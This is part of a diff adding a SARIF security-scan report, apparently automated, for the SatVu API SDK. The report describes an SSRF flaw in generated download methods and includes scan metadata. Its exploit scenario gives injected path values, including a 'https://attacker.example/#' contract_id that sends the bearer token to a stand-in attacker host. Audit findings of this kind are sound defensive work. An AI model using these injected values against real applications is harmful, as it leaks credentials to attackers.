+            "text": "Streaming *_to_file methods put raw path parameters into the authenticated download URL (separate code path from the template).\n\nThe AST generator for streaming download methods builds url=<path>.format(name=name) from the raw arguments with no percent-encoding, and always sets follow_redirects=True. A caller-supplied item_id (typed str), or a non-UUID string passed as contract_id/order_id, re-targets the bearer-authenticated GET through urljoin dot-segment and absolute-URL resolution in the adapters. Fixing only the Jinja template would leave this path open.\n\nImpact: The application's credentials are aimed at unintended SatVu endpoints, or (stdlib/urllib3 backend, untyped contract_id input) the token leaks to an attacker host.\n\nExploit scenario: An application passes a user-supplied item_id to sdk.cos.download_order_item_to_file(...). A value such as \"../../../../<other SatVu path>#\" makes the SDK send the application's bearer token in a GET to a different SatVu endpoint, and the response is streamed to the application's output path. On the stdlib or urllib3 backend, a string contract_id of \"https://attacker.example/#\" sends the token off-host.\n\nPreconditions: A consuming application passes attacker-influenced strings into the streaming method's path parameters; For an off-host leak: stdlib or urllib3 adapter, plus a non-UUID string reaching contract_id.\n\nRecommendation: Wrap each path-parameter value in a quote(str(x), safe=\"\") call node (and add the urllib.parse import through add_imports_to_ast) instead of passing the bare ast.Name.\n\nCWE-918. Severity LOW, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/builder/ast_generator.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 206,
+                  "snippet": {
+                    "text": "            ast.keyword(arg=name, value=ast.Name(id=name, ctx=ast.Load()))"
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "ASTMethodBuilder._build_body",
+                  "fullyQualifiedName": "ASTMethodBuilder._build_body"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F12",
+              "title": "Streaming *_to_file methods put raw path parameters into the authenticated download URL (separate code path from the template)",
+              "impact": "The application's credentials are aimed at unintended SatVu endpoints, or (stdlib/urllib3 backend, untyped contract_id input) the token leaks to an attacker host.",
+              "file": "src/builder/ast_generator.py",
+              "line": 206,
+              "description": "The AST generator for streaming download methods builds url=<path>.format(name=name) from the raw arguments with no percent-encoding, and always sets follow_redirects=True. A caller-supplied item_id (typed str), or a non-UUID string passed as contract_id/order_id, re-targets the bearer-authenticated GET through urljoin dot-segment and absolute-URL resolution in the adapters. Fixing only the Jinja template would leave this path open.",
+              "exploit_scenario": "An application passes a user-supplied item_id to sdk.cos.download_order_item_to_file(...). A value such as \"../../../../<other SatVu path>#\" makes the SDK send the application's bearer token in a GET to a different SatVu endpoint, and the response is streamed to the application's output path. On the stdlib or urllib3 backend, a string contract_id of \"https://attacker.example/#\" sends the token off-host.",
+              "preconditions": [
+                "A consuming application passes attacker-influenced strings into the streaming method's path parameters",
+                "For an off-host leak: stdlib or urllib3 adapter, plus a non-UUID string reaching contract_id"
+              ],
+              "category": "Server-Side Request Forgery (SSRF)",
+              "severity": "LOW",
+              "confidence": "medium",
+              "recommendation": "Wrap each path-parameter value in a quote(str(x), safe=\"\") call node (and add the urllib.parse import through add_imports_to_ast) instead of passing the bare ast.Name.",
+              "cwe_id": "CWE-918",
+              "snippet": "            ast.keyword(arg=name, value=ast.Name(id=name, ctx=ast.Load()))",
+              "symbol": "ASTMethodBuilder._build_body",
+              "declared_line": 206,
+              "via_change": null,
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:190e5d363989e4a19022773b1a312ffd90b0783af5e34ee0cc28cde6ef877db0",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        }
+      ],
+      "properties": {
+        "claudeSecurityPlugin": {
+          "generated_at": "2026-10-06T13:28:50+00:00",
+          "scan_id": "c481680b-a056-4f95-8301-42f63d7c7e30",
+          "mode": "scan",
+          "scan_prefix": "",
+          "scope": [],
+          "revision": {
+            "versioned": true,
+            "branch": "main",
+            "dirty": false
+          },
+          "revision_source": "self-reported",
+          "effort": "medium",
+          "run_shape": {
+            "requested_effort": "medium",
+            "collapsed": null,
+            "source": "coverage.json",
+            "diff_files": null,
+            "diff_lines": null,
+            "pre_existing": 0,
+            "scope_files": null,
+            "empty_diff": false,
+            "empty_scope": false,
+            "researchers_dispatched": 50,
+            "skipped_components": [
+              {
+                "name": "github-workflows",
+                "paths": [
+                  ".github"
+                ],
+                "reason": "CI workflow/dependabot config, not application code; low-value for a code-focused security review"
+              },
+              {
+                "name": "docs",
+                "paths": [
+                  "docs"
+                ],
+                "reason": "Markdown documentation only, no executable code"
+              },
+              {
+                "name": "services-test-infra",
+                "paths": [
+                  "src/satvu/services/conftest.py",
+                  "src/satvu/services/example_cache.py",
+                  "src/satvu/services/schema_conformance.py"
+                ],
+                "reason": "Test fixtures/pytest conftest and request-body conformance checks used only by the generated test suite, excluded from the shipped wheel, not production runtime code"
+              }
+            ],
+            "completeness_check_outcome": "checked",
+            "unaccounted_top_level_dirs": [],
+            "inventory_fallback": null,
+            "top_level_dir_count": 6,
+            "target_files": 482,
+            "component_cap": 24,
+            "research_coverage": {
+              "files": 451,
+              "read": 356,
+              "not_reached": 95,
+              "unaccounted": 0,
+              "outside_components": 31,
+              "capped": false
+            }
+          },
+          "findings": {
+            "total": 12,
+            "critical": 0,
+            "high": 0,
+            "medium": 9,
+            "low": 3
+          },
+          "verification": {
+            "status": "verified",
+            "candidates": 46,
+            "candidates_deduped": 21,
+            "panel_votes": 63,
+            "panel_reviewed_findings": 12,
+            "panel_quorum_findings": 12,
+            "unreviewed_candidate_sites": 0,
+            "incomplete_panel_candidates": 0,
+            "attested_findings": 0,
+            "reason": null,
+            "researchers_dispatched": 50,
+            "researchers_returned": 50
+          },
+          "target_kind": "git-remote"
+        }
+      },
+      "versionControlProvenance": [
+        {
+          "repositoryUri": "https://github.com/SatelliteVu/satvu-api-sdk"
+        }
+      ]
+    }
+  ]
+}
